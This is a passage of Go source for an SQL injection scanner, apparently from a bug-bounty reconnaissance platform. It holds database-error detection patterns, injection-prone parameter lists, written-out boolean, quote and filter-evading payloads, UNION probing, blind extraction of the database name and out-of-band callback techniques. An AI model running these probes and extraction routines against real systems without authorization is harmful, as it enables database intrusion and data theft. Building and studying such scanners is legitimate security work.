package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type SQLiScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewSQLiScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *SQLiScanner {
	return &SQLiScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var sqliHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   20 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// SQL error signatures — presence after a quote injection = error-based SQLi.
var sqlErrorSignatures = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*\Wmysqli?_`),
	regexp.MustCompile(`(?i)mysql_(?:fetch|num_rows|query)\w*\(\).*expects parameter`),
	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
	regexp.MustCompile(`(?i)check the manual that corresponds to your (MySQL|MariaDB) server version`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)pg_query\(\):`),
	regexp.MustCompile(`(?i)unterminated quoted string at or near`),
	regexp.MustCompile(`(?i)(?:pq:|Postgres(?:QL)? said:).*syntax error at or near`),
	regexp.MustCompile(`(?i)Microsoft SQL Server`),
	regexp.MustCompile(`(?i)Unclosed quotation mark after the character string`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)(?:SQL Server|SqlException).*Incorrect syntax near`),
	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)SQLite3?::`),
	regexp.MustCompile(`(?i)sqlite3.OperationalError`),
	regexp.MustCompile(`(?i)SQLITE_ERROR`),
	regexp.MustCompile(`(?i)SQLSTATE\[`),
	// DB2, Firebird, Sybase — rarer in bug-bounty scope but zero-cost to check
	// for and previously entirely absent, so a hit on one of these engines was
	// silently invisible to error-based detection.
	regexp.MustCompile(`(?i)DB2 SQL error`),
	regexp.MustCompile(`(?i)SQLCODE[=:]\s*-\d+`),
	regexp.MustCompile(`(?i)Dynamic SQL Error`),
	regexp.MustCompile(`(?i)Firebird`),
	regexp.MustCompile(`(?i)Sybase message`),
	regexp.MustCompile(`(?i)SybSQLException`),
	regexp.MustCompile(`(?i)org\.h2\.jdbc\.JdbcSQL(?:Syntax)?ErrorException`),
	regexp.MustCompile(`(?i)org\.hsqldb\.HsqlException`),
	regexp.MustCompile(`(?i)\[HDBODBC\].*(?:syntax error|invalid SQL)`),
	regexp.MustCompile(`(?i)SAP DBTech JDBC: \[\d+\]:`),
	regexp.MustCompile(`(?i)Informix.*(?:SQL error|syntax error)`),
	regexp.MustCompile(`(?i)com\.informix\.jdbc`),
	regexp.MustCompile(`(?i)\[Vertica\](?:\[VJDBC\])?`),
	regexp.MustCompile(`(?i)DB::Exception:.*(?:Syntax error|Cannot parse)`),
	regexp.MustCompile(`(?i)ClickHouse exception`),
	regexp.MustCompile(`(?i)SQL compilation error:`), // Snowflake
	regexp.MustCompile(`(?i)(?:io\.trino|io\.prestosql)\..*Exception`),
	regexp.MustCompile(`(?i)CockroachDB.*(?:syntax error|SQLSTATE)`),
	// Additional driver/ORM/framework error strings sqlmap ships in its errors.xml
	// — these surface a DB error through the app's stack even when the raw engine
	// message is wrapped. Still specific enough that a match after quote injection
	// (and NOT in the baseline) is a real error-based signal, not a generic 500.
	regexp.MustCompile(`(?i)You have an error in your SQL syntax`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)com\.mysql\.jdbc\.`),
	regexp.MustCompile(`(?i)org\.postgresql\.util\.PSQLException`),
	regexp.MustCompile(`(?i)Npgsql\.`),
	regexp.MustCompile(`(?i)System\.Data\.SqlClient\.SqlException`),
	regexp.MustCompile(`(?i)System\.Data\.OleDb\.OleDbException`),
	regexp.MustCompile(`(?i)Microsoft OLE DB Provider for (?:ODBC Drivers|SQL Server)`),
	regexp.MustCompile(`(?i)\[Microsoft\]\[ODBC SQL Server Driver\]`),
	regexp.MustCompile(`(?i)quoted string not properly terminated`),
	regexp.MustCompile(`(?i)Syntax error or access violation`),
	regexp.MustCompile(`(?i)Zend_Db_(?:Statement|Adapter)_Exception`),
	regexp.MustCompile(`(?i)Doctrine\\DBAL`),
	regexp.MustCompile(`(?i)SQLSTATE\[\w+\]\s*\[\d+\]`),
	regexp.MustCompile(`(?i)PDOException`),
	regexp.MustCompile(`(?i)java\.sql\.SQLSyntaxErrorException`),
	regexp.MustCompile(`(?i)org\.hibernate\.(?:exception\.)?SQLGrammarException`),
	regexp.MustCompile(`(?i)ActiveRecord::StatementInvalid`),
	regexp.MustCompile(`(?i)django\.db\.utils\.(?:ProgrammingError|OperationalError)`),
	regexp.MustCompile(`(?i)SequelizeDatabaseError`),
}

// SQLi-prone parameter names — these carry DB lookups far more often than others.
// Curated from real-world SQLi reports (HackerOne/Exploit-DB): the names that most
// often map straight onto a WHERE clause, ORDER BY, LIMIT/OFFSET, or a lookup key.
var sqliProneParams = map[string]bool{
	"id": true, "uid": true, "user": true, "userid": true, "user_id": true,
	"page": true, "pid": true, "p": true, "cat": true, "category": true,
	"catid": true, "item": true, "itemid": true, "product": true, "prod": true,
	"pro_id": true, "order": true, "orderby": true, "order_by": true, "sort": true,
	"sort_by": true, "sortby": true, "dir": true, "num": true,
	"no": true, "key": true, "year": true, "month": true, "day": true,
	"offset": true, "limit": true, "start": true, "gid": true, "aid": true,
	"cid": true, "sid": true, "ref": true, "news": true, "article": true,
	"articleid": true, "post": true, "postid": true, "view": true, "select": true,
	"where": true, "search": true, "query": true, "q": true, "type": true,
	// ORDER BY / column-name sinks (string-context SQLi — the injection sits in the
	// ORDER BY or a column list, not a numeric WHERE; a very common real finding).
	"column": true, "col": true, "field": true, "group": true, "groupby": true,
	"having": true, "table": true, "row": true, "record": true,
	// Lookup keys that resolve to a single DB row.
	"doc": true, "docid": true, "document": true, "file_id": true, "fileid": true,
	"report": true, "report_id": true, "reportid": true, "invoice": true,
	"invoice_id": true, "txn": true, "transaction": true, "transaction_id": true,
	"payment_id": true, "coupon": true, "promo": true, "voucher": true,
	"store": true, "store_id": true, "shop": true, "branch": true, "city_id": true,
	"region_id": true, "country_id": true, "parent": true, "parent_id": true,
	"node": true, "node_id": true, "slug": true, "code": true, "sku": true,
	"serial": true, "ticket": true, "ticket_id": true, "msgid": true,
	"message_id": true, "thread": true, "thread_id": true, "comment_id": true,
	"tag_id": true, "album_id": true, "photo_id": true, "video_id": true,
	"media_id": true, "event_id": true, "booking": true, "booking_id": true,
	"reservation": true, "order_id": true, "orderid": true, "customer_id": true,
	"account_id": true, "profile_id": true, "group_id": true, "role_id": true,
}

// sqliFallbackMaxParams is used only by unit tests/standalone callers that do
// not provide Config. A real scan follows Config.URLLimit(); its default is
// effectively unlimited, so every distinct discovered insertion point is tested.
const sqliFallbackMaxParams = 2000

// Value-shape signatures for DB-lookup-like GET parameters (see selectCandidates).
var (
	reLookupUUID   = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	reLookupDate   = regexp.MustCompile(`^\d{4}[-/.]\d{1,2}[-/.]\d{1,2}$`)
	reLookupHexID  = regexp.MustCompile(`(?i)^[0-9a-f]{6,32}$`) // hex row id / short hash
	reLookupNumSep = regexp.MustCompile(`^\d+[,;:|_-]\d+`)      // composite key: 12-34, 5,6
)

// looksLikeDBLookup reports whether a GET value has the SHAPE of a database lookup
// key even though its name isn't in the prone list and it isn't a bare integer.
// Deliberately narrow (UUID / date / hex id / composite numeric) so free-text
// search terms and language/format flags don't balloon the SQLi candidate set —
// the detection itself is control-based and precise regardless, but keeping the
// candidate set targeted keeps the scan fast.
func looksLikeDBLookup(val string) bool {
	v := strings.TrimSpace(val)
	if v == "" || len(v) > 64 {
		return false
	}
	return reLookupUUID.MatchString(v) || reLookupDate.MatchString(v) ||
		reLookupHexID.MatchString(v) || reLookupNumSep.MatchString(v)
}

// Run performs deterministic SQLi checks over every discovered insertion point,
// prioritising likely DB-backed fields without excluding unfamiliar names.
// Deterministic tests per candidate (error-based + boolean/content + arithmetic),
// plus out-of-band blind SQLi. No time-based verdicts. Then move on.
func (s *SQLiScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "sqli", "Starting SQLi checks across query, path, form, JSON and header insertion points...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "sqli", fmt.Sprintf("Selected %d high-value insertion points for SQLi testing", len(candidates)))
	auth := loadAuthHeaders(ctx, s.db, targetID)

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64
	var flaggedMu sync.Mutex
	flagged := make(map[string]bool)

	for _, ip := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			if kind, ev := s.quickProbe(ctx, ip, auth); kind != "" {
				s.store(targetID, "sqli", "high", ip, kind, ev+" ["+ip.Method+"/"+insertionLocation(ip)+"]")
				found.Add(1)
				flaggedMu.Lock()
				flagged[insertionIdentity(ip)] = true
				flaggedMu.Unlock()
				logFn("warn", "sqli", fmt.Sprintf("SQLi (%s): %s param=%s [%s]", kind, ip.URL, ip.Param, ip.Method))
				s.notify(targetID, ip.URL, ip.Param)
			}
		}(ip)
	}
	wg.Wait()

	// STATISTICAL TIME-BASED pass (bounded). Runs on candidates the deterministic
	// pass did NOT already flag. It never trusts a single timer: it proves a
	// server-side SLEEP by requiring the delay to scale linearly with the injected
	// sleep (see sqli_timing.go). Low concurrency because each confirmation holds a
	// connection for several seconds; capped so the heavy stage stays bounded.
	s.timeBasedPass(ctx, targetID, candidates, flagged, auth, &found, logFn)

	// Second-order (stored) SQLi: plant a stored error-force payload through write
	// (POST/body) params, then re-read the target's pages for a delayed marker leak
	// — an injection whose sink runs on a later, different request.
	s.secondOrderChecks(ctx, targetID, candidates, auth, &found, logFn)

	// Header/cookie insertion points use the same error/boolean/extraction/timing
	// proof ladder and preserve the authenticated identity.
	s.headerChecks(ctx, targetID, auth, logFn, &found)

	// Blind (out-of-band) SQLi — the SQLi objective OWNS its blind confirmation via
	// the shared OOB capability: DB functions that make the SERVER itself reach our
	// host (Oracle UTL_HTTP/HTTPURITYPE, MSSQL xp_dirtree UNC, …) prove injection
	// with ZERO visible response signal — the error/boolean/time paths above can all
	// miss behind a WAF or on a stored query. A callback is reported as a blind_sqli
	// finding via RecordOOBHit. No-op without a configured callback URL.
	s.plantBlindSQLi(ctx, targetID, logFn)

	logFn("info", "sqli", fmt.Sprintf("SQLi check done. Found %d candidates.", found.Load()))
	return nil
}

// plantBlindSQLi plants out-of-band SQLi payloads across every insertion point,
// each registered under its own token so a later callback attributes to blind_sqli.
func (s *SQLiScanner) plantBlindSQLi(ctx context.Context, targetID string, logFn LogFunc) {
	o, ok := newOOBCapability(s.cfg)
	if !ok {
		return
	}
	points := s.selectCandidates(ctx, targetID)
	if len(points) == 0 {
		return
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)
	n := o.plantClass(ctx, s.db, targetID, points, auth, "sqli",
		nil, // OOB SQL functions are tried on every param, as before
		func(cb string) []string { return sqliOOBPayloads(cb, o.callbackHost) })
	if n > 0 {
		logFn("info", "sqli", fmt.Sprintf("Planted %d blind-SQLi OOB probe(s); execution reported via callback.", n))
	}
}

// selectCandidates returns every distinct, in-scope insertion point. Likely
// DB-backed parameters are sorted first so a user-supplied module limit spends
// its budget well, but an unfamiliar string parameter is never silently thrown
// away. CMS routes and analytics-looking names remain eligible: plugins/themes
// and logging/attribution tables are real SQL sinks, and proof is differential.
func (s *SQLiScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
	rows, err := s.db.QueryContext(ctx, `
		SELECT url, parameter, COALESCE(value,''), COALESCE(method,'GET'),
		       COALESCE(content_type,''), COALESCE(location,'query'), COALESCE(is_reflected,0)
		FROM parameters WHERE target_id = ?
		ORDER BY COALESCE(is_reflected,0) DESC, url, parameter
	`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	type rankedIP struct {
		ip        insertionPoint
		priority  int
		reflected int
	}
	numeric := regexp.MustCompile(`^[+-]?\d+(?:\.\d+)?$`)
	seen := make(map[string]bool)
	siblingGroups := make(map[string]map[string]string)
	siblingTypeGroups := make(map[string]map[string]string)
	var ranked []rankedIP
	for rows.Next() {
		var ip insertionPoint
		var reflected int
		if err := rows.Scan(&ip.URL, &ip.Param, &ip.Value, &ip.Method, &ip.ContentType, &ip.Location, &reflected); err != nil {
			continue
		}
		ip.Method = strings.ToUpper(strings.TrimSpace(ip.Method))
		if ip.Method == "" {
			ip.Method = "GET"
		}
		if ip.Param == "" || !urlHostInScope(ctx, ip.URL) {
			continue
		}
		groupKey := sqliSiblingGroupKey(ip)
		loc := insertionLocation(ip)
		if loc == "body" || loc == "json" || loc == "multipart" || loc == "xml" || strings.HasPrefix(loc, "graphql:") {
			if siblingGroups[groupKey] == nil {
				siblingGroups[groupKey] = map[string]string{}
			}
			siblingGroups[groupKey][ip.Param] = ip.Value
			if typ := jsonTypeFromLocation(ip.Location); typ != "" {
				if siblingTypeGroups[groupKey] == nil {
					siblingTypeGroups[groupKey] = map[string]string{}
				}
				siblingTypeGroups[groupKey][ip.Param] = typ
			}
		}
		lname := strings.ToLower(ip.Param)
		key := insertionIdentity(ip)
		if seen[key] {
			continue
		}
		seen[key] = true
		priority := reflected * 10
		if sqliProneParams[lname] {
			priority += 100
		}
		if numeric.MatchString(strings.TrimSpace(ip.Value)) {
			priority += 80
		} else if looksLikeDBLookup(ip.Value) {
			priority += 60
		}
		switch insertionLocation(ip) {
		case "json":
			priority += 50
		case "multipart":
			priority += 45
		case "xml":
			priority += 45
		case "body":
			priority += 40
		case "path":
			priority += 35
		default:
			if strings.HasPrefix(insertionLocation(ip), "path:") {
				priority += 35
			}
		}
		ranked = append(ranked, rankedIP{ip: ip, priority: priority, reflected: reflected})
	}
	for i := range ranked {
		ip := &ranked[i].ip
		groupKey := sqliSiblingGroupKey(*ip)
		if group := siblingGroups[groupKey]; len(group) > 0 {
			ip.Siblings = make(map[string]string, len(group))
			for k, v := range group {
				ip.Siblings[k] = v
			}
		}
		if types := siblingTypeGroups[groupKey]; len(types) > 0 {
			ip.SiblingTypes = make(map[string]string, len(types))
			for k, v := range types {
				ip.SiblingTypes[k] = v
			}
		}
	}
	sort.SliceStable(ranked, func(i, j int) bool {
		if ranked[i].priority != ranked[j].priority {
			return ranked[i].priority > ranked[j].priority
		}
		return insertionIdentity(ranked[i].ip) < insertionIdentity(ranked[j].ip)
	})
	// Concrete IDs discovered from crawl/history often produce thousands of rows
	// for one route handler. Keep two semantically distinct representatives per
	// normalized route (valid/invalid or public/private variance) while retaining
	// every literal route and every distinct request contract.
	semanticCounts := map[string]int{}
	compacted := ranked[:0]
	for _, r := range ranked {
		if routeKey, normalized := semanticRouteIdentity(r.ip); normalized {
			if semanticCounts[routeKey] >= 2 {
				continue
			}
			semanticCounts[routeKey]++
		}
		compacted = append(compacted, r)
	}
	ranked = compacted
	limit := sqliFallbackMaxParams
	if s.cfg != nil {
		limit = s.cfg.URLLimit()
	}
	if limit <= 0 || limit > len(ranked) {
		limit = len(ranked)
	}
	out := make([]insertionPoint, 0, limit)
	for _, r := range ranked[:limit] {
		out = append(out, r.ip)
	}
	return out
}

func jsonTypeFromLocation(location string) string {
	loc := strings.ToLower(strings.TrimSpace(location))
	if strings.HasPrefix(loc, "json:") {
		return strings.TrimPrefix(loc, "json:")
	}
	return ""
}

func sqliSiblingGroupKey(ip insertionPoint) string {
	loc := insertionLocation(ip)
	if strings.HasPrefix(loc, "graphql:") {
		parts := strings.Split(loc, ":")
		if len(parts) >= 3 {
			loc = strings.Join(parts[:3], ":") // same endpoint + operation
		}
	}
	return strings.ToUpper(ip.Method) + "\x00" + ip.URL + "\x00" +
		strings.ToLower(ip.ContentType) + "\x00" + loc
}

// sqliBaseValue keeps the request on the originally discovered object/route.
// Empty form fields have no useful baseline, so use a conservative numeric seed.
func sqliBaseValue(ip insertionPoint) string {
	if v := strings.TrimSpace(ip.Value); v != "" && len(v) <= 256 {
		return v
	}
	if idx, ok := isPathLocation(ip.Location); ok {
		if u, err := url.Parse(ip.URL); err == nil {
			segs := strings.Split(strings.Trim(u.Path, "/"), "/")
			if idx >= 0 && idx < len(segs) && segs[idx] != "" {
				return segs[idx]
			}
		}
	}
	return "1"
}

type sqliBooleanPair struct{ tru, fls, condFmt string }

// sqliBooleanPairs applies each boundary to the real baseline value. This keeps
// UUID/string/date routes valid while still covering numeric, quoted, parenthesis
// and comment-filter contexts.
func sqliBooleanPairs(ip insertionPoint) []sqliBooleanPair {
	b := sqliBaseValue(ip)
	return []sqliBooleanPair{
		{b + " AND 1=1", b + " AND 1=2", b + " AND (%s)"},
		{b + "' AND '1'='1", b + "' AND '1'='2", b + "' AND (%s) AND '1'='1"},
		{b + " AND 1=1-- -", b + " AND 1=2-- -", b + " AND (%s)-- -"},
		{b + " AND 1=1#", b + " AND 1=2#", b + " AND (%s)#"},
		{b + "' AND '1'='1'#", b + "' AND '1'='2'#", b + "' AND (%s)#"},
		{b + `" AND "1"="1`, b + `" AND "1"="2`, b + `" AND (%s) AND "1"="1`},
		{b + ") AND (1=1)-- -", b + ") AND (1=2)-- -", b + ") AND (%s)-- -"},
		{b + ")) AND ((1=1))-- -", b + ")) AND ((1=2))-- -", b + ")) AND (%s)-- -"},
		{b + "') AND ('1'='1", b + "') AND ('1'='2", b + "') AND (%s) AND ('1'='1"},
		{b + "/**/aNd/**/1=1", b + "/**/aNd/**/1=2", b + "/**/aNd/**/(%s)"},
		{b + "'/**/aNd/**/'1'='1", b + "'/**/aNd/**/'1'='2", b + "'/**/aNd/**/(%s)/**/aNd/**/'1'='1"},
	}
}

func sqliArithmeticPairs(ip insertionPoint) (eq, diff, eq2, diff2, condFmt string, ok bool) {
	n, err := strconv.ParseInt(strings.TrimSpace(sqliBaseValue(ip)), 10, 64)
	if err != nil || n > 1_000_000_000 || n < -1_000_000_000 {
		return "", "", "", "", "", false
	}
	return fmt.Sprintf("%d-1", n+1), fmt.Sprintf("%d-1", n+2),
		fmt.Sprintf("%d-3", n+3), fmt.Sprintf("%d-3", n+4),
		fmt.Sprintf("%d AND (%%s)", n), true
}

// quickProbe: error-based + blind boolean/content + arithmetic differential,
// each reproduced before it counts. This fast stage is deterministic; the
// statistical time-based proof runs separately at low concurrency.
func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string) {
	baselineValue := sqliBaseValue(ip)
	// Error-based: try quote/identifier/parenthesis boundaries independently. A
	// single payload containing every quote type is easy for a WAF to block and can
	// be syntactically invalid in a way that hides the engine's useful error.
	base, baseStatus, baseDuration := sendInjectedFull(ctx, sqliHTTPClient, ip, baselineValue, auth)
	for _, suffix := range []string{"'", `"`, "`", "')", `\")`, "\\"} {
		injected := baselineValue + suffix
		errResp, errStatus, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, injected, auth)
		if looksLikeBlockPage(errStatus, errResp) {
			continue
		}
		for _, sig := range sqlErrorSignatures {
			if !sig.MatchString(errResp) || sig.MatchString(base) {
				continue
			}
			// Reproduce against a fresh baseline: a one-shot upstream 500 is not SQLi.
			base2, _, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, baselineValue, auth)
			errResp2, errStatus2, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, injected, auth)
			if !sig.MatchString(errResp2) || sig.MatchString(base2) || looksLikeBlockPage(errStatus2, errResp2) {
				continue
			}
			evidence := fmt.Sprintf("DB error triggered by boundary %q (reproduced; absent from baseline)", suffix)
			if dbms := fingerprintDBMS(errResp); dbms != "" {
				evidence += " — engine: " + dbms
			}
			// UNION enrichment runs only on an already-proven parameter.
			if cols, unionFmt := s.unionColumnBoundary(ctx, ip, auth); cols > 0 {
				if pos, payload := s.unionMarkerColumnWithTemplate(ctx, ip, auth, cols, unionFmt); pos > 0 {
					evidence = fmt.Sprintf("%s; UNION-based PROVEN: %d column(s), marker reflects in column %d — PoC: %s", evidence, cols, pos, payload)
				} else {
					evidence = fmt.Sprintf("%s; UNION column count likely %d (marker reflection not confirmed — output may not be rendered directly)", evidence, cols)
				}
			}
			return "error_based", evidence
		}
	}

	// DBMS-adaptive error-FORCED extraction (item 2): make the engine raise an
	// error carrying a value it computed for us (unique marker + version). For
	// MySQL the marker is sent as a hex literal, so an ASCII match is proof the DB
	// evaluated it — reflection-proof. Runs with WAF-bypass tampering. This catches
	// injections that don't error on a bare quote but DO on a type-cast/subquery.
	if kind, ev := s.errorForceProbe(ctx, ip, auth, base); kind != "" {
		return kind, ev
	}

	// Boolean-based (blind): a TRUE condition must yield ~the baseline response
	// while a FALSE condition changes it. Catches injections that never error or
	// sleep. Low-FP: TRUE must match baseline AND FALSE must differ from TRUE by a
	// real margin, and it must reproduce.
	baseLen := len(base)
	// Adaptive thresholds: measure THIS endpoint's own response-size noise floor
	// and scale the "meaningful difference" bar off it instead of fixed 48/200
	// constants — a dynamic page that wobbles hundreds of bytes on its own no
	// longer trips the boolean differential. Also a WAF gate: if the benign
	// baseline itself is a block/challenge page, boolean testing is meaningless.
	vol := measureVolatilitySeeded(ctx, sqliHTTPClient, ip, auth, baselineValue,
		base, baseStatus, baseDuration, true)
	if vol.blocked {
		return "", ""
	}

	// Length-based boolean/arithmetic differential is only trustworthy on a page
	// whose size is STABLE and NOT truncated. Huge, highly-dynamic pages — e.g. a
	// marketplace product page with rotating recommendations — wobble by hundreds
	// of KB between IDENTICAL requests and exceed the response read cap, so every
	// response comes back the same truncated size (or wildly different for a reason
	// that has nothing to do with SQL). That turns any TRUE/FALSE size delta into
	// pure noise: the #1 source of blind-boolean false positives (the basalam-style
	// FPs). Bail out of length-differential testing for such endpoints — error- and
	// error-based detection is unaffected because it does not rely on response size.
	const sqliBodyCap = 512 * 1024
	booleanReliable := baseStatus != 0 && baseLen < sqliBodyCap && vol.valid &&
		vol.baseLen < sqliBodyCap &&
		(vol.baseLen == 0 || vol.noise <= vol.baseLen/8) && vol.noise <= 20000

	if booleanReliable {
		// mkSQLmapCmd builds a copy-pasteable sqlmap PoC for the report evidence.
		mkSQLmapCmd := func() string {
			return fmt.Sprintf("sqlmap -u '%s' -p %s --batch --technique=B", ip.URL, ip.Param)
		}
		// Each pair carries a condFmt that wraps an arbitrary boolean SQL condition in
		// the SAME injection syntax the TRUE/FALSE pair proved (one %s). A detected
		// differential is only reported after blindExtractDBName USES that oracle to
		// read the current database name — a bare differential (CDN/id→object
		// endpoints) extracts nothing and is dropped as a false positive.
		for _, pair := range sqliBooleanPairs(ip) {
			tr := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
			fr := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
			tResp, fResp := tr.Body, fr.Body
			if tr.Status == 0 || fr.Status == 0 {
				continue
			}
			// If either response hit the read cap it's truncated → size is unreliable.
			if len(tResp) >= sqliBodyCap || len(fResp) >= sqliBodyCap {
				continue
			}
			// A block/challenge page carries a per-request id → its size wobbles like a
			// real boolean signal. Never derive a finding from one.
			if looksLikeBlockPage(tr.Status, tResp) || looksLikeBlockPage(fr.Status, fResp) {
				continue
			}
			// Require: TRUE ~ baseline, FALSE differs from BOTH the TRUE response AND
			// the baseline (a parameter that merely changes the page on any value would
			// only satisfy the first).
			trueLikeBase := tr.Status == baseStatus && vol.matchesBaseline(len(tResp))
			falseDiffers := fr.Status != baseStatus ||
				(abs(len(tResp)-len(fResp)) > vol.sigDiff(200) && abs(len(fResp)-baseLen) > vol.sigDiff(200))
			if trueLikeBase && falseDiffers {
				// Confirm: repeat once, and check the pattern holds (guards dynamic pages).
				t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
				f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
				reproducedFalse := f2.Status != baseStatus ||
					(abs(len(t2.Body)-len(f2.Body)) > vol.sigDiff(200) && abs(len(f2.Body)-baseLen) > vol.sigDiff(200))
				if t2.Status == baseStatus && vol.matchesBaseline(len(t2.Body)) && reproducedFalse &&
					!looksLikeBlockPage(f2.Status, f2.Body) {
					// PROVE it: use the oracle to extract the current database name. A bare
					// size differential that cannot extract is NOT reported (it is the
					// dominant blind-boolean false positive).
					isTrueLike := func(r injectedResponse) bool {
						return r.Status == baseStatus && vol.matchesBaseline(len(r.Body))
					}
					if name, dbms, ok := s.blindExtractDBNameResponse(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
						return "boolean_based", fmt.Sprintf(
							"blind boolean SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q → %dB (~baseline %dB); FALSE payload %q → %dB (differs). Endpoint noise floor %dB. Verify: %s",
							ip.Param, blindSQLProofDescription(name, dbms), pair.tru, len(tResp), baseLen, pair.fls, len(fResp), vol.noise, mkSQLmapCmd())
					}
				}
			}

			// CONTENT differential — catches the boolean SQLi the SIZE check MISSES:
			// a TRUE/FALSE pair whose responses are the SAME LENGTH but DIFFERENT
			// CONTENT (a full record vs a "not found" page that happen to be equal
			// size, a swapped equal-length status label, etc.). Requires TRUE to be the
			// SAME object as the baseline (the '1' row) AND FALSE to render a
			// materially different one — the same bar IDOR uses (bodiesSameObject:
			// exact / near-length + volatile-field blurring + chunk comparison). This
			// is FP-safe: a reflected payload makes TRUE differ from the baseline (so
			// it fails the TRUE~baseline test), and an inert parameter makes FALSE ==
			// baseline (so it fails the FALSE-differs test). Reproduced once, and gated
			// by the stable-page precondition (booleanReliable) so a dynamic page
			// cannot trip it.
			if tr.Status == baseStatus && bodiesSameObject(base, tResp) &&
				(fr.Status != baseStatus || !bodiesSameObject(base, fResp)) {
				t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
				f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
				if t2.Status == baseStatus && bodiesSameObject(base, t2.Body) &&
					(f2.Status != baseStatus || !bodiesSameObject(base, f2.Body)) &&
					!looksLikeBlockPage(f2.Status, f2.Body) {
					// PROVE it via extraction through the object-identity oracle. This is the
					// path that used to FP on CDN/id→object endpoints (the aparat.com report):
					// they render different objects for different ids but expose no SQL, so
					// extraction fails and no finding is emitted.
					isTrueLike := func(r injectedResponse) bool {
						return r.Status == baseStatus && bodiesSameObject(base, r.Body)
					}
					if name, dbms, ok := s.blindExtractDBNameResponse(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
						return "boolean_based", fmt.Sprintf(
							"blind boolean SQLi on param %q (content-differential oracle) — PROVEN by extraction: %s. TRUE payload %q renders the baseline object while FALSE %q renders a different one, and the oracle exfiltrated a DB-computed value. Verify: %s",
							ip.Param, blindSQLProofDescription(name, dbms), pair.tru, pair.fls, mkSQLmapCmd())
					}
				}
			}
		}

		// When the discovered value does not select a row, an AND oracle has no
		// visible channel: both TRUE and FALSE return the same empty result. OR-based
		// boundaries invert that geometry (TRUE selects rows, FALSE stays empty).
		if value, dbms, tru, fls, ok := s.orBasedBlindExtract(ctx, ip, auth); ok {
			return "boolean_based", fmt.Sprintf(
				"OR-based blind SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q and FALSE payload %q formed a stable two-sided oracle even though the original value selected no row. Verify: %s",
				ip.Param, blindSQLProofDescription(value, dbms), tru, fls, mkSQLmapCmd())
		}

		// ORDER BY / sort-expression SQLi is not a WHERE predicate: appending
		// "AND 1=1" can be invalid even when the value is injectable. Build a
		// CASE-based ordering oracle and, as with the regular boolean path, report
		// only after it extracts a DB-computed value through that oracle.
		if isOrderByParameter(ip.Param) {
			if value, dbms, tru, fls, ok := s.orderByBlindExtract(ctx, ip, auth); ok {
				return "boolean_based", fmt.Sprintf(
					"ORDER BY expression SQLi on param %q — PROVEN by CASE-order oracle and extraction: %s. TRUE ordering payload %q and FALSE payload %q produced two stable result orders; arbitrary DB conditions were then extracted through the same oracle. Verify: %s",
					ip.Param, blindSQLProofDescription(value, dbms), tru, fls, mkSQLmapCmd())
			}
		}

		// Arithmetic differential (sqlmap-style): our injected base is "1". "2-1"
		// evaluates to 1 inside the SQL query, so it must behave like the baseline;
		// "3-1" evaluates to 2 (a different row), so it must differ. A NON-injectable
		// parameter treats "2-1" as the literal string "2-1", so both differ from the
		// "1" baseline and nothing matches. Catches numeric-context injections that
		// never error or sleep and that reject the AND/OR keywords a WAF/keyword
		// filter blocks — a classic real-world SQLi a keyword-only check misses.
		eqPayload, diffPayload, eqPayload2, diffPayload2, arithmeticCond, arithmeticOK := sqliArithmeticPairs(ip)
		var eq, dif string
		if arithmeticOK {
			eq, _ = sendInjected(ctx, sqliHTTPClient, ip, eqPayload, auth)
			dif, _ = sendInjected(ctx, sqliHTTPClient, ip, diffPayload, auth)
		}
		if arithmeticOK && len(eq) > 0 && len(dif) > 0 && len(eq) < sqliBodyCap && len(dif) < sqliBodyCap &&
			!bodyLooksLikeWAFBlock(eq) && !bodyLooksLikeWAFBlock(dif) &&
